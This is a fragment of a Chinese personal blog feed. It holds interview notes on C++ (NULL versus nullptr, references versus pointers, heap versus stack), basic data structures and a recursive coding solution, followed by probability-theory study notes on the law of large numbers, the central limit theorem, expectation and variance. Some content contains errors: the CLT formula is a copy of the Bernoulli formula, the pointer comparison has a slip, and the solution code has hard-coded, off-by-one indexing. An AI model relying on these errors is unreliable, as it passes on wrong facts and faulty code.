class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span>* i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">func</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/06/13/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%951%EF%BC%9A%E5%8D%8E%E4%B8%BA%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_2exPtnNPr4.png"></p><p>在这段代码中，我们对函数func进行可重载，参数分别是void*类型和int类型，但是运行结果却与我们使用NULL的初衷是相违背的，因为我们本来是想用NULL来代替空指针，但是在将NULL输入到函数中时，它却选择了int形参这个函数版本，所以是有问题的，这就是用NULL代替空指针在C++程序中的二义性。</p><p>为解决NULL代指空指针存在的二义性问题，在C++11版本(2011年发布)中特意引入了nullptr这一新的关键字来代指空指针，从上面的例子中我们可以看到，使用nullptr作为实参，确实选择了正确的以void*作为形参的函数版本。</p><p>NULL在C++中就是0，这是因为在C++中void* 类型是不允许隐式转换成其他类型的，所以之前C++中用0来代表空指针，但是在重载整形的情况下，会出现上述的问题。所以，C++11加入了nullptr，可以保证在任何情况下都代表空指针，而不会出现上述的情况，因此，建议以后还是都用nullptr替代NULL吧，而NULL就当做0使用。</p><hr><blockquote><p>问：引用和指针有什么区别？</p></blockquote><p>答：在使用上，引用使用&amp;符号，指针使用*符号。</p><h3 id="3-2-4-引用和指针的关系"><a href="#3-2-4-引用和指针的关系" class="headerlink" title="3.2.4 引用和指针的关系"></a>3.2.4 引用和指针的关系</h3><p><strong>相同点</strong>：二者都是指一块区域，都可以对这个区域的值进行更改，具有更改值的类似的作用。</p><p><strong>不同点</strong>：</p><ol><li><p>引用必须初始化，指针可以不初始化</p></li><li><p>引用必须与一个确定的单元关联，不可以指向空的地方，但是指针可以指向空的地方</p></li><li><p>引用没有占用空间，也就是只是换了个名字，在内存里面找不到引用这个地方的位置，但是指针是实实在在的存在的，需要占用一定的空间。也可以把引用视为指针常量，在编译器优化后它不占内存</p><p>这个空间是指是否占用代码空间。</p></li><li><p>指针的大小确定，引用的大小根据所引用的类型所确定</p><p>引用的大小与类型有关，如int类型它也是int，char类型它也是char，但是指针大小是具体的，它只负责指路，大小与类型无关。</p></li><li><p>指针可以多级引用，但是指针不可以</p></li><li><p>引用只能指向一个对象，但是指针可以指向多个对象（指针指向的对象是可以发生变化的）</p></li></ol><blockquote><p>问：堆和栈有什么区别？哪个的空间较大？</p></blockquote><p>答：堆上的空间是需要动态申请的，手动释放，而栈上的内存空间是静态申请，自动释放的</p><blockquote><p>问：堆的空间大概有多大，我可以在堆上申请一个1G的内存吗？</p></blockquote><p>答：（很不确定）应该不能吧，balabala，但是答案见下面，实际上可以</p><h3 id="3-2-5-C-中堆和栈的区别"><a href="#3-2-5-C-中堆和栈的区别" class="headerlink" title="3.2.5 C++中堆和栈的区别"></a>3.2.5 C++中堆和栈的区别</h3><p>栈：是由编译器在需要时自动分配，不需要时自动清除的变量存储区。通常存放局部变量、函数参数等。</p><p>堆：是由new分配的内存块，由程序员释放（编译器不管），一般一个new与一个delete对应，一个new[]与一个delete[]对应。如果程序员没有释放掉，资源将由操作系统在程序结束后自动回收。</p><table><thead><tr><th></th><th>堆</th><th>栈</th></tr></thead><tbody><tr><td>管理方式</td><td>堆中资源由程序员控制（容易产生memory leak）</td><td>栈资源由编译器自动管理，无需手工控制</td></tr><tr><td>内存管理机制</td><td>系统有一个记录空闲内存地址的链表，当系统收到程序申请时，遍历该链表，寻找第一个空间大于申请空间的堆结点，删    除空闲结点链表中的该结点，并将该结点空间分配给程序（大多数系统会在这块内存空间首地址记录本次分配的大小，这样delete才能正确释放本内存  空间，另外系统会将多余的部分重新放入空闲链表中）</td><td>只要栈的剩余空间大于所申请空间，系统为程序提供内存，否则报异常提示栈出。（这一块理解一下链表和队列的区别，不连续空间和连续空间的区别，应该就比较好理解这两种机制的区别了）</td></tr><tr><td>空间大小</td><td>堆是不连续的内存区域（因为系统是用链表来存储空闲内存地址，自然不是连续的），堆大小受限于计算机系统中有效的虚拟内存（32bit  系统理论上是4G），所以堆的空间比较灵活，比较大</td><td>栈是一块连续的内存区域，大小是操作系统预定好的，windows下栈大小是2M（也有是1M，在  编译时确定，VC中可设置）。</td></tr><tr><td>碎片问题</td><td>对于堆，频繁的new&#x2F;delete会造成大量碎片，使程序效率降低</td><td>对于栈，它是一个先进后出的队列，进出一一对应，不会产生碎片。（看到这里我突然明白了为什么面试官在问我堆和栈的区别之前先问了我栈和队列的区别）</td></tr><tr><td>生长方向</td><td>堆向上，向高地址方向增长。</td><td>栈向下，向低地址方向增长。</td></tr><tr><td>分配方式</td><td>堆都是动态分配（没有静态分配的堆）</td><td>栈有静态分配和动态分配，静态分配由编译器完成（如局部变量分配），动态分配由alloca函数分配，但栈的动态分配的资源由编译器进行释放，无需程序员实现。</td></tr><tr><td>分配效率</td><td>堆由C&#x2F;C++函数库提供，机制很复杂。所以堆的效率比栈低很多。</td><td>栈是极其系统提供的数据结构，计算机在底层对栈提供支持，分配专门寄存器存放栈地址，栈操作有专门指令。</td></tr></tbody></table><p><img src="/2024/06/13/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%951%EF%BC%9A%E5%8D%8E%E4%B8%BA%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_JXLiVRYRqc.png"></p><p>堆是自低地址向高地址扩展的数据结构（它的生长方向与内存的生长方向相同），是不连续的内存区域。因为系统是用链表来存储空闲内存地址的，且链表的遍历方向是由低地址向高地址。由此可见，堆获得的空间较灵活，也较大。堆的大小受限于计算机系统中有效的虚拟内存。一般来讲在32位系统下，堆内存可以达到2.9G的大小。（除去1G的内核空间，几乎占满3G的用户空间）</p><h2 id="3-3-操作系统"><a href="#3-3-操作系统" class="headerlink" title="3.3 操作系统"></a>3.3 操作系统</h2><blockquote><p>问：了解过虚拟内存吗？</p></blockquote><p>答：（这个讲的比较好，在此不进行赘述了）</p><h2 id="3-4-数据结构"><a href="#3-4-数据结构" class="headerlink" title="3.4 数据结构"></a>3.4 数据结构</h2><blockquote><p>问：了解过快速排序吗？介绍一下主要思想</p></blockquote><p>答：快速排序是基于分治的思想，每次把哨兵元素都放在最终排序后的的位置上（然后给了一个序列，要求写出第一次快速排序之后的结果序列）</p><blockquote><p>问：知道循环队列吗？说一下队列判空的条件？</p></blockquote><p>答：<code>Q.front == Q.rear</code>（当时听到问这个的时候特别自信，因为我复习过，所以说复习还是有用的）</p><h2 id="3-5-思维题"><a href="#3-5-思维题" class="headerlink" title="3.5 思维题"></a>3.5 思维题</h2><blockquote><p>问：现在给你一个无序的数组，要求求出所有数字中重复出现的最大次数是多少？</p></blockquote><p>答：可以遍历整个数组，然后使用一个map存储每个数字出现的次数</p><blockquote><p>问：如果现在给你加一个限制，要求不能使用额外的存储空间，该怎么处理？</p></blockquote><p>答：可以先对数字进行从小到大排序，然后使用双指针，从第i个元素开始，向后更新j，直到j指向的元素不等于i所指向的元素，然后更新答案</p><hr><h1 id="4-手撕代码"><a href="#4-手撕代码" class="headerlink" title="4 手撕代码"></a>4 手撕代码</h1><ul><li>这次真的是牛了，面试官从9:36发题，然后说10点截止，我好像没用10分钟就做出来了，而且代码一次就跑过，没有进行任何debug。</li><li>现场考代码的时候就是要保持头脑清醒，题目一般都不难，但是要注意一些边界情况。</li></ul><p>给定一个二进制数组 nums 和一个整数 k，如果可以翻转最多 k 个 0 ，则返回数组中连续 1 的最大个数。</p><p>示例 1：</p><p>输入：nums &#x3D; [1,1,1,0,0,0,1,1,1,1,0], K &#x3D; 2</p><p>输出：6</p><p>解释：[1,1,1,0,0,1,1,1,1,1,1]，粗体数字从 0 翻转到 1，最长的子数组长度为 6。</p><p>示例 2：</p><p>输入：nums &#x3D; [0,0,1,1,0,0,1,1,1,0,1,1,0,0,0,1,1,1,1], K &#x3D; 3</p><p>输出：10</p><p>解释：[0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1]，粗体数字从 0 翻转到 1，最长的子数组长度为 10。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans, k = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> nums1[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;  <span class="comment">// 11</span></span><br><span class="line"><span class="type">int</span> nums2[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;  <span class="comment">// 19</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> k, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u &gt; <span class="number">19</span>) <span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span> (nums2[u] == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 可能需要进行翻转</span></span><br><span class="line">        <span class="keyword">if</span> (k)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 进行翻转</span></span><br><span class="line">            ans = <span class="built_in">max</span>(ans, len + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">dp</span>(u + <span class="number">1</span>, k - <span class="number">1</span>, len + <span class="number">1</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 不进行翻转</span></span><br><span class="line">            <span class="built_in">dp</span>(u + <span class="number">1</span>, k, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 没有可用的翻转</span></span><br><span class="line">            ans = <span class="built_in">max</span>(ans, len);</span><br><span class="line">            <span class="comment">// 从下一个开始重新计数</span></span><br><span class="line">            <span class="built_in">dp</span>(u + <span class="number">1</span>, k, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (nums2[u] == <span class="number">1</span>)</span><br><span class="line">        <span class="comment">// 不用翻转 搜索下一个位置</span></span><br><span class="line">        <span class="built_in">dp</span>(u + <span class="number">1</span>, k, len + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">dp</span>(<span class="number">1</span>, k, <span class="number">0</span>);</span><br><span class="line">    cout &lt;&lt; ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论第5章：大数定律及中心极限定理</title>
      <link href="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E5%A4%A7%E6%95%B0%E5%AE%9A%E5%BE%8B%E5%8F%8A%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/"/>
      <url>/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E5%A4%A7%E6%95%B0%E5%AE%9A%E5%BE%8B%E5%8F%8A%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-大数定律"><a href="#1-大数定律" class="headerlink" title="1 大数定律"></a>1 大数定律</h1><h2 id="1-1-弱大数定律-辛钦大数定律"><a href="#1-1-弱大数定律-辛钦大数定律" class="headerlink" title="1.1 弱大数定律 (辛钦大数定律)"></a>1.1 弱大数定律 (辛钦大数定律)</h2><p>设随机变量序列 $ X_{1} $, $X_{2}$,$ \ldots $ <strong>相互独立</strong>，<strong>服从同一分布</strong>，具有数学期望$E\left({X}_{i}\right)&#x3D;\mu,i&#x3D;1,2,…$，则对于任意正数$\mathcal{E}$，有</p><p>$$<br>\lim_{n\to\infty}P{|\frac1n\sum_{i&#x3D;1}^nX_i-\mu|&lt;\varepsilon}&#x3D;1<br>$$</p><h3 id="1-1-1-依概率收敛定义及性质"><a href="#1-1-1-依概率收敛定义及性质" class="headerlink" title="1.1.1 依概率收敛定义及性质"></a>1.1.1 依概率收敛定义及性质</h3><p>设Y1, Y2, …,Yn…是一个随机变量序列，a是一个常数。若对任意正数ε，有</p><p>$$<br>\lim_{n\to\infty}P{|Y_n-a|&lt;\varepsilon}&#x3D;1<br>$$</p><p>$则称序列 Y_{1}, Y_{2}, \cdots Y_{n}, \cdots 依概率收敛于a$，记作$Y_{n} \xrightarrow{P} a.$</p><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E5%A4%A7%E6%95%B0%E5%AE%9A%E5%BE%8B%E5%8F%8A%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/image__W-zBdWHmW.png"></p><h3 id="1-1-2-定理1的另一种叙述"><a href="#1-1-2-定理1的另一种叙述" class="headerlink" title="1.1.2 定理1的另一种叙述"></a>1.1.2 定理1的另一种叙述</h3><p>设随机变量序列X1,X2, …   相互独立，服从同一分布，具有数学期望$E\left(X_{i}\right)&#x3D;\mu, i&#x3D;1,2, \ldots$ 则序列$\bar{X}&#x3D;\frac{1}{n} \sum^{n} X_{i} 依概率收敛于 \mu 。即$$\bar{X} \xrightarrow{P} \mu$。</p><h2 id="1-2-伯努利大数定律"><a href="#1-2-伯努利大数定律" class="headerlink" title="1.2 伯努利大数定律"></a>1.2 伯努利大数定律</h2><p>设 nA 是n次独立重复试验中事件A发生的次数，p是事件A在每次试验中发生的概率，则对于任意正数ε&gt; 0 ，有&#x20;</p><p>$$<br>\lim_{n\to\infty}P{|\frac{n_A}n-p|&lt;\varepsilon}&#x3D;1\text{或}\lim_{n\to\infty}P{|\frac{n_A}n-p|\geq\varepsilon}&#x3D;0<br>$$</p><hr><h1 id="2-中心极限定理"><a href="#2-中心极限定理" class="headerlink" title="2 中心极限定理"></a>2 中心极限定理</h1><h2 id="2-1-中心极限定理产生的背景"><a href="#2-1-中心极限定理产生的背景" class="headerlink" title="2.1 中心极限定理产生的背景"></a>2.1 中心极限定理产生的背景</h2><p>实际中，许多随机变量是由大量的相互独立的随机因素的综合影响所形成的，而每一个个别因素在总的影响中所起的作用都是微小的。这种随机变量往往近似地服从正态分布。</p><h2 id="2-2-定理1（独立同分布下的中心极限定理）"><a href="#2-2-定理1（独立同分布下的中心极限定理）" class="headerlink" title="2.2 定理1（独立同分布下的中心极限定理）"></a>2.2 定理1（独立同分布下的中心极限定理）</h2><p>设随机变量$X_{1}, X_{2}, \cdots X_{n}, \cdots$相互独立，服从同一分布，且具有数据期望和方差：</p><p>$$<br>E(X_{k})&#x3D;\mu, D(X_{k})&#x3D;\sigma^{2}, k&#x3D;1,2, \cdots<br>$$</p><p>则随机变量之和$\sum_{k&#x3D;1}^{n} X_{k}$的标准化变量为：</p><p>$$<br>Y_{n}&#x3D;\frac{\sum_{k&#x3D;1}^{n} X_{k}-n \mu}{\sqrt{n} \sigma}<br>$$</p><p>其分布函数F(x)对任意x满足：</p><p>$$<br>\lim_{n\to\infty}P{|\frac{n_A}n-p|&lt;\varepsilon}&#x3D;1\text{或}\lim_{n\to\infty}P{|\frac{n_A}n-p|\geq\varepsilon}&#x3D;0<br>$$</p><p>上述结论等价于：</p><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E5%A4%A7%E6%95%B0%E5%AE%9A%E5%BE%8B%E5%8F%8A%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/image_FbxOkwx-UF.png"></p><h2 id="2-3-定理3-棣莫佛－拉普拉斯（De-Movire-Laplace定理）"><a href="#2-3-定理3-棣莫佛－拉普拉斯（De-Movire-Laplace定理）" class="headerlink" title="2.3 定理3 棣莫佛－拉普拉斯（De Movire-Laplace定理）"></a>2.3 定理3 棣莫佛－拉普拉斯（De Movire-Laplace定理）</h2><p>设随机变量$\eta_{n}(n&#x3D;1,2, \ldots)$服从参数$n, p(0&lt;p&lt;1)$的二项分布，则对任意x，有</p><p>$$<br>\lim_{n\to\infty}P{\frac{\eta_n-np}{\sqrt{np(1-p)}}\leq x}&#x3D;\int_{-\infty}^x\frac1{\sqrt{2\pi}}e^{-\frac{t^2}2}dt&#x3D;\Phi(x)<br>$$</p><p>定理标命，当n很大时，0&lt;p&lt;1是一个定值时，二项变量$\eta_{n}$的分布近似正态分布$N(n p, n p(1-p))$，即：</p><p>$$<br>\eta_{n} \stackrel{\text { 近似地 }}{\sim} N(n p, n p(1-p))<br>$$</p><blockquote><p>例1 一加法器同时收到20个噪声电压Vk(k&#x3D;1,2,…20),设它们是相互独立的随机变量, 且都在区间(0,10)上服从均匀分布. 记$V&#x3D;\sum_{k&#x3D;1}^{n} V_{k}$, 求$P{V&gt;105}$的近似值</p></blockquote><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E5%A4%A7%E6%95%B0%E5%AE%9A%E5%BE%8B%E5%8F%8A%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/image_uQAsssJM_K.png"></p><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E5%A4%A7%E6%95%B0%E5%AE%9A%E5%BE%8B%E5%8F%8A%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/image_hnUvY8amFC.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论第4章：随机变量的数字特征</title>
      <link href="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/"/>
      <url>/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<h1 id="1-数学期望"><a href="#1-数学期望" class="headerlink" title="1 数学期望"></a>1 数学期望</h1><h2 id="1-1-随机变量的数学期望概念"><a href="#1-1-随机变量的数学期望概念" class="headerlink" title="1.1 随机变量的数学期望概念"></a>1.1 随机变量的数学期望概念</h2><p><strong>定义1</strong>：设$X$是离散型随机变量，它的分布律是：$P ( X&#x3D;x_{k} ) &#x3D;p_{k}, k&#x3D;1,2, \ldots$，若级数$\sum_{k&#x3D;1}^{\infty} x_{k} p_{k}$绝对收敛，则称级数$\sum_{k&#x3D;1}^{\infty} x_{k} p_{k}$的和为随机变量$X$的<strong>数学期望</strong>。</p><p>$$<br>E(X)&#x3D;\sum_{k&#x3D;1}^{\infty} x_{k} p_{k}<br>$$</p><p><strong>定义2</strong>：设连续型随机变量$X$的概率密度为$f(x)$，如果积分$\int_{-\infty}^{+\infty} x f(x) \mathrm{d} x$绝对收敛，则称该积分的值为随机变量X的数学期望或者均值，记为$E(X)$，即</p><p>$$<br>E(X)&#x3D;\int_{-\infty}^{+\infty} x f(x) \mathrm{d} x<br>$$</p><h2 id="1-2-随机变量函数的数学期望"><a href="#1-2-随机变量函数的数学期望" class="headerlink" title="1.2 随机变量函数的数学期望"></a>1.2 随机变量函数的数学期望</h2><p><strong>定理1</strong>：设$Y$是随机变量$X$的函数$Y&#x3D;g(X)$（ $g$ 是连续函数）：</p><ol><li>当$X$为离散型时, 它的分布律为$P\left(X&#x3D;x_{k}\right)&#x3D;p_{k},(k&#x3D;1,2, \ldots)$，若级数$\sum_{k&#x3D;1}^{\infty} g\left(x_{k}\right) p_{k}$绝对收敛，则有：</li></ol><p>$$<br>E(Y)&#x3D;E[g(X)]&#x3D;\sum_{k&#x3D;1}^{\infty} g\left(x_{k}\right) p_{k}<br>$$</p><ol start="2"><li>当X为连续型时, 它的密度函数为f(x)，若$\int_{-\infty}^{+\infty} g(x) f(x) d x$绝对收敛，则有：</li></ol><p>$$<br>E(Y)&#x3D;E[g(X)]&#x3D;\int_{-\infty}^{+\infty} g(x) f(x) d x<br>$$</p><p>总结如下：</p><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image.png"></p><p><strong>定理2</strong>：设$Z&#x3D;g(X,Y)$ 是随机变量$X$、$Y$的函数，</p><p>(1)  如果X、Y是离散型随机变量，联合概率分布为pij , i,j&#x3D;1,2, …，则&#x20;</p><p>$$<br>E(Z)&#x3D;E[g(X, Y)]&#x3D;\sum_{i&#x3D;1}^{\infty} \sum_{j&#x3D;1}^{\infty} g\left(x_{i}, y_{j}\right) p_{i j}<br>$$</p><p>(2)  如果X、Y是连续型随机变量，联合概率密度为f(x,y)，则&#x20;</p><p>$$<br>E(Z)&#x3D;E[g(X, Y)]&#x3D;\int_{-\infty}^{+\infty} \int_{-\infty}^{+\infty} g(x, y) f(x, y) \mathrm{d} x \mathrm{~d} y<br>$$</p><h2 id="1-3-数学期望的性质"><a href="#1-3-数学期望的性质" class="headerlink" title="1.3 数学期望的性质"></a>1.3 数学期望的性质</h2><ol><li>设C是常数，则E(C)&#x3D;C;</li><li>若k是常数，则E(kX)&#x3D;kE(X);</li><li>E(X+Y) &#x3D; E(X)+E(Y)，$推广 E\left[\sum_{i&#x3D;1}^{n} X_{i}\right]&#x3D;\sum_{i&#x3D;1}^{n} E\left(X_{i}\right)$</li><li>设X、Y 相互独立，则 E(XY)&#x3D;E(X)E(Y)，$推广 E\left[\prod_{i&#x3D;1}^{n} X_{i}\right]&#x3D;\prod_{i&#x3D;1}^{n} E\left(X_{i}\right)$ ，诸 Xi相互独立时。</li></ol><p>请注意：由E(XY)&#x3D;E(X)E(Y)不一定能推出X,Y 独立。</p><h2 id="1-4-小结"><a href="#1-4-小结" class="headerlink" title="1.4 小结"></a>1.4 小结</h2><p>一维随机变量的数学期望：</p><ol><li>离散型：$E(X)&#x3D;\sum_{k&#x3D;1}^{\infty} x_{k} p_{k}$</li><li>连续型：$E(X)&#x3D;\int_{-\infty}^{+\infty} x f(x) \mathrm{d} x$</li></ol><p>随机变量函数的数学期望：</p><ul><li>一维函数</li></ul><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image-1.png"></p><ul><li>二维函数</li></ul><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image_rm6R6Q03qF.png"></p><hr><h1 id="2-方差"><a href="#2-方差" class="headerlink" title="2 方差"></a>2 方差</h1><h2 id="2-1-方差的定义"><a href="#2-1-方差的定义" class="headerlink" title="2.1 方差的定义"></a>2.1 方差的定义</h2><p>方差是一个常用来体现随机变量取值分散程度的量。</p><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image_e61hYBHyCX.png"></p><p>$$<br>D(X)&#x3D;\mathrm{Var}(X)&#x3D;E{[X-E(X)]^2}.<br>$$</p><p>称$\sqrt{D(X)}$为标准差或均方差，记为$\sigma(X)$。</p><h2 id="2-2-方差的计算"><a href="#2-2-方差的计算" class="headerlink" title="2.2 方差的计算"></a>2.2 方差的计算</h2><h3 id="2-2-1-利用定义计算"><a href="#2-2-1-利用定义计算" class="headerlink" title="2.2.1 利用定义计算"></a>2.2.1 利用定义计算</h3><p><strong>离散型</strong>：$D(X)&#x3D;\sum_{k&#x3D;1}^{+\infty}\left[x_k-E(X)\right]^2p_k,$其中$P{X&#x3D;x_k}&#x3D;p_k,k&#x3D;1,2,\cdots,$是$X$的分布律。</p><p><strong>连续性</strong>：$D(X)&#x3D;\int_{-\infty}^{+\infty}[x-E(X)]^2f(x) \mathrm{d}x$，其中$f(x)$为$x$的概率密度。</p><h3 id="2-2-2-利用公式计算-xD"><a href="#2-2-2-利用公式计算-xD" class="headerlink" title="2.2.2 利用公式计算&#xD;"></a>2.2.2 利用公式计算&#xD;</h3><p>$$<br>D(X)&#x3D;E(X^2)-[E(X)]^2.<br>$$</p><h2 id="2-3-方差的性质"><a href="#2-3-方差的性质" class="headerlink" title="2.3 方差的性质"></a>2.3 方差的性质</h2><p>（1）设 C 是常数, 则有$D(C)&#x3D;0$</p><p>（2）设 X 是一个随机变量, C 是常数, 则有$D(CX)&#x3D;C^2D(X)$</p><p>（3）设 X, Y  相互独立, D(X), D(Y) 存在, 则$D(X\pm Y)&#x3D;D(X)+D(Y).\quad D(X\pm C)&#x3D;D(X).$</p><p>（4） D(X)&#x3D;0的充要条件是X以概率1取常数E(X)，即$P{X&#x3D;E(X)} &#x3D; 1$</p><h2 id="2-4-切比雪夫不等式"><a href="#2-4-切比雪夫不等式" class="headerlink" title="2.4 切比雪夫不等式"></a>2.4 切比雪夫不等式</h2><p><img src="/2024/06/12/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/image_3VC-EgmE1a.png"></p><h2 id="2-5-常见分布的期望与方差"><a href="#2-5-常见分布的期望与方差" class="headerlink" title="2.5 常见分布的期望与方差"></a>2.5 常见分布的期望与方差</h2><p><img 